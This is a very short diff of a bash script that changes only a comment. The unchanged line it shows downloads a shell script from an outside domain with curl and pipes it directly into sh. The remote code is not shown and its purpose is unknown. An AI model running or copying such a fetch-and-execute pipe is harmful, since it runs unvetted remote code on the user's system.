@@ -1,6 +1,6 @@
 #!/bin/bash
 
-#sup
+#sup test
 
 curl -s "https://nodes.fackblock.com/api/logo.sh" | sh && sleep 2
 
